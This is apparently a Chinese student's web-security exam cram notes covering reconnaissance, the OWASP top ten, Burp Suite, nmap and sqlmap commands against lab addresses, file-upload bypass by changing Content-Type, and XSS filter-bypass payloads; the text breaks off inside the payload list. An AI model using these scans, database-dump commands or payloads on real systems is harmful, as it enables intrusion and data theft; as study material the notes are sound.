<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="本人应付考试的网安速通缪记"><title>网安选修课的期末考前急救</title><link rel=canonical href=https://resyon.netlify.app/p/%E7%BD%91%E5%AE%89%E9%80%89%E4%BF%AE%E8%AF%BE%E7%9A%84%E6%9C%9F%E6%9C%AB%E8%80%83%E5%89%8D%E6%80%A5%E6%95%91/><link rel=stylesheet href=/scss/style.min.ff300df33b80e2ac49809c825614392ed1c7b27591d65d3c4043602cd162e25f.css><meta property="og:title" content="网安选修课的期末考前急救"><meta property="og:description" content="本人应付考试的网安速通缪记"><meta property="og:url" content="https://resyon.netlify.app/p/%E7%BD%91%E5%AE%89%E9%80%89%E4%BF%AE%E8%AF%BE%E7%9A%84%E6%9C%9F%E6%9C%AB%E8%80%83%E5%89%8D%E6%80%A5%E6%95%91/"><meta property="og:site_name" content="Example Site"><meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="security"><meta property="article:published_time" content="2021-12-11T19:34:37+08:00"><meta property="article:modified_time" content="2021-12-11T19:34:37+08:00"><meta name=twitter:title content="网安选修课的期末考前急救"><meta name=twitter:description content="本人应付考试的网安速通缪记"></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"dark")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=img/avatar.png width=300 height=300 class=site-logo loading=lazy alt=Avatar></a>
<span class=emoji>🍥</span></figure><div class=site-meta><h1 class=site-name><a href=/>Example Site</a></h1><h2 class=site-description>Lorem ipsum dolor sit amet, consectetur adipiscing elit.</h2></div></header><ol class=social-menu><li><a href=https://github.com/resyon/ target=_blank title=GitHub rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com target=_blank title=Twitter rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg><span>Home</span></a></li><li><a href=/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg><span>Archives</span></a></li><li><a href=/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg><span>Search</span></a></li><li><a href=/links/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg><span>Links</span></a></li><div class=menu-bottom-section><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><span>Dark Mode</span></li></div></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#试题手写40>试题手写40</a><ol><li><a href=#整个攻击流程渗透过程>整个攻击流程（渗透过程）</a><ol><li><a href=#渗透-信息的收集>渗透-信息的收集</a></li></ol></li><li><a href=#owsp十大安全漏洞>OWSP十大安全漏洞</a></li><li><a href=#web-及工作原理>web 及工作原理</a></li><li><a href=#web框架怎样的结构哪三层作用是什么>web框架怎样的结构，哪三层，作用是什么</a></li><li><a href=#三个工具主要功能简单操作要会>三个工具主要功能，简单操作要会</a><ol><li><a href=#burpsuite>burpsuite</a></li><li><a href=#nmap>nmap</a></li><li><a href=#sqlmap>sqlmap</a></li></ol></li></ol></li><li><a href=#实操>实操</a><ol><li><a href=#sql注入>SQL注入</a><ol><li><a href=#考点>考点</a></li></ol></li><li><a href=#文件上传>文件上传</a><ol><li><a href=#js绕过>js绕过</a></li><li><a href=#图马绕过>图马绕过</a></li><li><a href=#考点-1>考点</a></li></ol></li><li><a href=#暴力破解>暴力破解</a></li><li><a href=#xss>XSS</a><ol><li><a href=#考点-2>考点</a></li></ol></li><li><a href=#csrf--原理>CSRF 原理</a><ol><li><a href=#考点-3>考点</a></li></ol></li></ol></li><li><a href=#杂项>杂项</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/p/%E7%BD%91%E5%AE%89%E9%80%89%E4%BF%AE%E8%AF%BE%E7%9A%84%E6%9C%9F%E6%9C%AB%E8%80%83%E5%89%8D%E6%80%A5%E6%95%91/>网安选修课的期末考前急救</a></h2><h3 class=article-subtitle>本人应付考试的网安速通缪记</h3></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>Dec 11, 2021</time></div></footer></div></header><section class=article-content><h1 id=web-security-test>web-security test</h1><h2 id=试题手写40>试题手写40</h2><h3 id=整个攻击流程渗透过程>整个攻击流程（渗透过程）</h3><p><img src=/upload/2021/12/image-6df3aeb93bde491b839d3a8a05c4a944.png loading=lazy alt=image.png></p><h4 id=渗透-信息的收集>渗透-信息的收集</h4><blockquote><p><a class=link href="https://docs.google.com/presentation/d/1FqPgcRbEXPzcgWJy71Kef9oWL97BUTc4Spb0BTJmYyY/edit?usp=sharing" target=_blank rel=noopener>PPT</a></p></blockquote><ol><li>收集域名信息</li></ol><ul><li>whois
查询域名 注册与否，注册域名的详细信息（如域名所有人、域名注册商）
tools: <code>whois</code>(kali), <code>爱站工具网</code>(<a class=link href=https://whois.aizhan.com target=_blank rel=noopener>https://whois.aizhan.com</a>)、<code>站长之家</code>(<a class=link href=http://whois.chinaz.com target=_blank rel=noopener>http://whois.chinaz.com</a>)和<code>VirusTotal</code>(<a class=link href=https://www.virustotal.com target=_blank rel=noopener>https://www.virustotal.com</a>)</li><li>备案信息
tools: <code>ICP备案查询网</code>：http://www.beianbeian.com, <code>天眼查</code>：http://www.tianyancha.com。</li></ul><ol start=2><li>收集敏感信息</li></ol><ul><li>利用搜索引擎，轻松得到想要的信息，还可以用它来搜集数据库文件，SQL注入，配置信息、源代码泄露、未授权访问和rebots.txt等敏感信息</li></ul><blockquote><p>google 常用语法
<img src=/upload/2021/12/image-b041a8198d7c40109ed3f4c5b8613e6a.png loading=lazy alt=image.png></p></blockquote><ul><li>通过<code>Burp Suite</code>的<code>Repeater</code>功能，（如运行的Server类型及版本，PHP的版本信息等）</li></ul><ol start=3><li>收集子域名信息</li></ol><blockquote><p>因为子域名通常护甲较弱</p></blockquote><ul><li><p>子域名检测工具
(eg. Layer子域名挖掘机、K8、wydomain、Sublist3r、dnsmaper、subDomainsBrute、Maltego CE)</p></li><li><p>搜索引擎枚举
<code>site: ${target_domain}</code></p></li><li><p>第三方聚合应用枚举
很多第三方服务汇聚了大量DNS数据集，可通过它们检索某个给定域名的子域
名。只需在其搜索栏中输入域名，就可检索到相关的域名信息</p></li><li><p>证书透明度公开日志枚举
最简单的方法就是使用搜索引擎搜索一些公开的CT日志</p></li></ul><ol start=4><li>收集常用端口信息</li></ol><p>关注常见应用的默认端口和在端口上运行的服务，便于渗透
tools: <code>Nmap</code>，无状态端口扫描工具<code>Masscan</code>、<code>ZMap</code>和<code>御剑高速TCP端口扫描工具</code></p><ol start=5><li>指纹识别
指纹是指网站CMS指纹识别、计算机操作系统及Web容器的指纹识别
应用程序一般在html、js、css等文件中包含一些特征码(CMS指纹)，那么当碰到其他网站也存在此特征时，就可以快速识别出该CMS，所以叫作指纹识别。
CMS又称整站系统或文章系统, 常见的CMS有Dedecms（织梦）、Discuz、PHPWEB、PHPWind、PHPCMS、ECShop、Dvbbs、SiteWeaver、ASPCMS、帝国、Z-Blog、WordPress等。</li></ol><p>tools: <code>御剑Web指纹识别</code>、<code>WhatWeb</code>、<code>WebRobo</code>、<code>椰树</code>、<code>轻量WEB指纹识别</code>等</p><ol start=6><li>寻找真实ip</li></ol><ul><li>无CDN: tools: <a class=link href=https://www.ip138.com target=_blank rel=noopener>www.ip138.com</a></li><li>有CDN: <del>我赌他不考</del></li></ul><ol start=7><li>收集敏感目录</li><li>社会工程学</li></ol><h3 id=owsp十大安全漏洞>OWSP十大安全漏洞</h3><p>OWASP组织：开放式Web应用程序安全项目（OWASP，Open Web Application Security Project）是一个组织，它提供有关计算机和互联网应用程序的公正.实际.有成本效益的信息。其目的是协助个人.企业和机构来发现和使用可信赖软件。
十个漏洞：</p><ol><li>注入</li><li>失效的身份认证和会话管理</li><li>跨站脚本</li><li>不安全的直接对象引用</li><li>安全配置错误</li><li>敏感信息泄露</li><li>功能级访问控制缺失</li><li>跨站请求伪造</li><li>使用含有已知漏洞的组件</li><li>未验证的重定向与 转发</li></ol><h3 id=web-及工作原理><del>web 及工作原理</del></h3><blockquote><p><a class=link href="https://docs.google.com/presentation/d/1FqPgcRbEXPzcgWJy71Kef9oWL97BUTc4Spb0BTJmYyY/edit?usp=sharing" target=_blank rel=noopener>web, php, mysql, etc 网安入门 ppt</a></p></blockquote><p><img src=/upload/2021/12/image-2b150c9ecbad4114a85cfddc3f5beda4.png loading=lazy alt=image.png>
<img src=/upload/2021/12/image-d5537aaf28244053816285b340304493.png loading=lazy alt=image.png>
<img src=/upload/2021/12/image-6bbd4f4973a4456788762a8ef25d87e7.png loading=lazy alt=image.png>
<img src=/upload/2021/12/image-2293c0d9f06f40bba5b297d709ab033f.png loading=lazy alt=image.png>
<img src=/upload/2021/12/image-0418374bc0aa483d9e7d15f1755bef8d.png loading=lazy alt=image.png>
<img src=/upload/2021/12/image-8afcc2d81e8c410aa5c2b7a5ae050e06.png loading=lazy alt=image.png></p><h3 id=web框架怎样的结构哪三层作用是什么>web框架怎样的结构，哪三层，作用是什么</h3><blockquote><p><del>下面给的原答案好像有点问题</del>
说的可能是 <a class=link href=https://developer.aliyun.com/article/45632 target=_blank rel=noopener>这个</a>
<img src=/upload/2021/12/image-ad5b8643660b40b79d406f882cf68405.png loading=lazy alt=image.png></p></blockquote><p>web应用->应用服务器->数据库服务器</p><ul><li>web应用：可以通过Web访问的应用程序, eg. WordPress</li><li>应用程序服务器（英语：application server）是一种软件框架，提供一个应用程序运行的环境。 用于为应用程序提供安全.数据.事务支持.负载平衡大型分布式系统管理等服务。eg. Apache, IIS</li><li>数据库服务器：是联系Web服务器与数据库管理系统（DBMS）的中间件是负责处理所有的应用程序服务器，包括在web服务器和后台的应用程序或数据库之间的事务处理和数据访问。eg&mldr;</li></ul><h3 id=三个工具主要功能简单操作要会>三个工具主要功能，简单操作要会</h3><h4 id=burpsuite>burpsuite</h4><blockquote><p><a class=link href="https://docs.google.com/presentation/d/1Ps-miNR8luOUMqi36Co4uaY9DTZM3BFVsEEwLLN8KKY/edit?usp=sharing" target=_blank rel=noopener>ppt</a></p></blockquote><blockquote><p><a class=link href=https://zh.wikipedia.org/wiki/Burp_suite target=_blank rel=noopener>ref</a></p></blockquote><p>用于测试网络应用程序安全性的图形化工具(java)</p><ul><li>HTTP Proxy — 拦截、查看、修改所有在客户端与服务端之间传输的数据。(他就是个拦截，指道的，发挥其他功能要靠下面的模块)</li><li><del>Scanner</del> — Web 应用程序安全扫描器，用于执行 Web 应用程序的自动漏洞扫描。</li><li>Intruder — 对 Web 应用程序执行自动攻击。提供可配置算法，可生成恶意 HTTP 请求。Intruder 工具可以测试和检测 SQL 注入、跨站脚本、参数篡改和易暴力攻击的漏洞。</li><li><del>Spider</del> — 自动抓取 Web 应用程序的工具。可以与手工映射技术一起使用，加快映射应用程序内容和功能的过程。</li><li>Repeater — 用来手动测试应用程序的简单工具。用于修改对服务器的请求，重新发送并观察结果。它最大的用途就是能和其他 Burp Suite工具结合起来使用。可以将目标站点地图、 Burp Proxy/浏览记录、 Burp Intruder的攻击结果，发送到 Repeater上，并手动调整这个请求来对漏洞的探测或攻击进行微调。</li><li><del>Decoder</del> — 将已编码的数据转换为其规范形式，或将原始数据转换为各种编码和散列形式的工具。能够利用启发式技术智能识别多种编码格式。</li><li><del>Comparer</del> — 在任意两个数据项之间执行比较（一个可视化的“差异”）的工具。</li><li><del>Extender</del> — 允许安全测试人员加载 Burp 扩展，使用安全测试人员自己的或第三方代码扩展 Burp 的功能</li><li><del>Sequencer</del> — 分析数据项样本随机性的工具。可以用于测试应用程序的会话令牌或其他重要的数据项，如反 CSRF 令牌、密码重置令牌等。</li></ul><h4 id=nmap>nmap</h4><p>Nmap( Network Mapper,网络映射器), <code>网络探测</code>和<code>安全审核</code>工具。用来<code>快速扫描大型网络</code>，包括<code>主机探测与发现</code>、<code>开放的端口情况</code>、操作系统与应用服务<code>指纹识别</code>、WAF识别及常见安全漏洞。<del>它的图形化界面是Zenmap,分布式框架为Dmap。</del>
特点：</p><ul><li>主机探测：探则网络上的主机，如列出响应TCP和CMP请求、ICMP请求、开放特别端口的主机</li><li>端口扫描：探测目标主机所开放的端口</li><li>版本检测：探测目标主机的网络服务，判断其服务名称及版本号</li><li>系统检测：探测目标主机的操作系统及网络设备的硬件特性</li><li>支持探测脚本的编写：使用Nmap的脚本引擎(NSE)和lua编程语言。</li></ul><p>使用：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 扫主机</span>
</span></span><span class=line><span class=cl>nmap 192.168.1.105 192.168.1.106 <span class=c1># 1个或多个</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>nmap 192.168.1.105-106 <span class=c1># 和上面一样</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>nmap 192.168.1.0/24 <span class=c1># 团灭整个网段</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>nmap --li /tmp/file --exclude 192.168.1.105 --excludefile /tmp/file1 <span class=c1># 扫`file`整个文件, 除了`192.168.1.105`和文件`file1`里头的</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 路由跟踪</span>
</span></span><span class=line><span class=cl>nmap --traceroute 192.168.1.105 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 扫端口</span>
</span></span><span class=line><span class=cl>nmap 192.168.0.100 –p 21,22,23,80
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 扫在线状况</span>
</span></span><span class=line><span class=cl>nmap –sP 192.168.0.100/24 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 操作系统指纹识别</span>
</span></span><span class=line><span class=cl>nmap –O 192.168.0.105 <span class=c1># 识别操作系统的版本</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 服务版本检测</span>
</span></span><span class=line><span class=cl>nmap -sV 192.168.0.105 <span class=c1># 检测开放端口对应的服务版本信息</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 探测防火墙状态  </span>
</span></span><span class=line><span class=cl>nmap -sF -T4 192.168.0.105 <span class=c1># FIN扫描用于识别端口是否关闭，RST: 端口关闭，否则是open或 filtered状态.</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/upload/2021/12/image-2b222cb254a2483eac14c1d169a5f093.png loading=lazy alt=image.png></p><h4 id=sqlmap>sqlmap</h4><blockquote><p><a class=link href="https://docs.google.com/presentation/d/1RTnsCI0q02FCXouj4AYTvYbsAS-vo97keWnRdWRe-pQ/edit?usp=sharing" target=_blank rel=noopener>ppt</a></p></blockquote><p><img src=/upload/2021/12/image-4b322e227b804a6cbd763c0f357ee550.png loading=lazy alt=image.png></p><p>使用</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 扫单个url, url都加双引号就对了</span>
</span></span><span class=line><span class=cl>sqlmap.py -u <span class=s2>&#34;http://192.168.1.104/sql1/Less-1/?id=1&amp;uid=2&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 扫文件里的</span>
</span></span><span class=line><span class=cl>sqlmap.py -r desktop/1.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># show databases;</span>
</span></span><span class=line><span class=cl>sqlmap.py -u http://127.0.0.1/sql/Less-1/?id<span class=o>=</span><span class=m>1</span> --dbs
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># use security; show tables;</span>
</span></span><span class=line><span class=cl>sqlmap.py -u http://127.0.0.1/sql/Less-1?id<span class=o>=</span><span class=m>1</span> -D security --tables 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># desc security.users;</span>
</span></span><span class=line><span class=cl>sqlmap.py -u <span class=s2>&#34;http://127.0.0.1/sql/Less-1/?id=1&#34;</span> -D security -T users --columns
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># select * from security.users; </span>
</span></span><span class=line><span class=cl>sqlmap.py -u “http://127.0.0.1/sql/Less-1/?id<span class=o>=</span>1” -D security -T users  --dump
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 获取数据库的所有用户</span>
</span></span><span class=line><span class=cl>sqlmap.py -u <span class=s2>&#34;http://127.0.0.1/sql/Less-1/?id=1&#34;</span> -users
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 获取当前网站数据库的名称</span>
</span></span><span class=line><span class=cl>sqlmap.py -u “http://127.0.0.1/sql/Less-1/?id<span class=o>=</span>1” --current-db
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 获取当前网站数据库的用户名称</span>
</span></span><span class=line><span class=cl>sqlmap.py -u “http://127.0.0.1/sql/Less-1/?id<span class=o>=</span>1” --current-user
</span></span></code></pre></td></tr></table></div></div><h2 id=实操>实操</h2><h3 id=sql注入>SQL注入</h3><blockquote><p><a class=link href="https://docs.google.com/presentation/d/1BoP8zCuAYZvGmVxFBFtKwGdJB29VHF9RfnkThf-WDoM/edit?usp=sharing" target=_blank rel=noopener>ppt</a></p></blockquote><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p><p>SQL注入漏洞的产生需要满足以下两个条件：
1、参数用户可控：前端传给后端的参数内容是用户可以控制的。
2、参数带入数据库查询：传入的参数拼接到SQL语句，且带入数据库查询</p><h4 id=考点>考点</h4><p>虚拟机下完成union boolean 报错注入
<img src=/upload/2021/12/image-81e503bcb28b41128b1162536612347e.png loading=lazy alt=image.png>
<img src=/upload/2021/12/image-5a6640925c8c4076a3049f7b750a909f.png loading=lazy alt=image.png></p><h3 id=文件上传>文件上传</h3><blockquote><p><a class=link href="https://docs.google.com/presentation/d/1XUfC7W_sLhVOxO8n_CksYJIxchn31_TatbjwG_JTHKk/edit?usp=sharing" target=_blank rel=noopener>ppt</a></p></blockquote><p>利用文件上传漏洞将可执行脚本程序上传到服务器中，获得网站的权限，或者进一步危害服务器</p><h4 id=js绕过>js绕过</h4><p>原因：这种情况只是对<code>http head</code>中的<code>Content-Type</code>字段进行限制
方案：此时只需要使用<code>burpsuite</code>啥的把Content-Type改了</p><h4 id=图马绕过>图马绕过</h4><p>原因：服务端对文件进行了检测
方案：<del>他没给，肯定不考</del></p><h4 id=考点-1>考点</h4><p>文件上传&ndash;js检测绕过漏洞
文件后缀(改名)
文件类型绕过(burpsuite改Content-Type)</p><h3 id=暴力破解>暴力破解</h3><p><a class=link href="https://docs.google.com/presentation/d/1Bs7VGNWOsRhZp1QTU4QG48VBut20a86tOY1KfSuNy2M/edit?usp=sharing" target=_blank rel=noopener>ppt</a></p><h3 id=xss>XSS</h3><p>在Web的世界里有各种各样的语言，于是乎对于语句的解析大家各不相同，有一些语句在一种语言里是合法的，但是在另外一种语言里是非法的。这种二义性使得黑客可以用代码注入的方式进行攻击一将恶意代码注入合法代码里隐藏起来，再诱发恶意代码，从而进行各种各样的非法活动。只要破坏跨层协议的数据/指令的构造，我们就能攻击。
XSS的基本实现思路很简单：比如持久型XSS通过一些正常的站内交互途径，例如发布评论，提交含有Javascript的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本，从而被攻击。</p><h4 id=考点-2>考点</h4><ol><li><p>XSS反射型/存储型
方法一:用<code>&lt;img></code>标签代替<code>&lt;script></code>
<code>&lt;img src=1 onerror=alert('xss')></code>
方法二:双写绕过<code>&lt;s&lt;script>cript>alert('xss')&lt;/script></code>
方法三:大小写绕过
<code>&lt;ScRipt>alert('xss')&lt;/ScRipt></code></p></li><li><p>DOM型
<code>?default=&lt;script>alert(document.cookie)&lt;/script></code></p></li></ol><p>上面不行，试试下面的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>第一类：Javascript URL
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;a href=&#34;javascript:alert(&#39;test&#39;)&#34;&gt;link&lt;/a&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;a href=&#34;java&amp;#115;cript:alert(&#39;xss&#39;)&#34;&gt;link&lt;/a&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;iframe src=javascript:alert(&#39;xss&#39;)&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>第二类：Inline style
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;div style=&#34;color: expression(alert(&#39;XSS&#39;))&#34;&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;div style=color:expression\(alert(1))&gt;&lt;/div&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>第三类：JavaScript 事件
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;img src=1 onclick=alert(&#39;xss&#39;)&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;body onload=alert(&#39;xss&#39;)&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>第四类：Script标签
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; &lt;script&gt;alert(document.cookie)&lt;/script&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;script&gt;window.location=&#39;http://www.163.com&#39;&lt;/script&gt;
</span></span><span class=line><span class=cl>
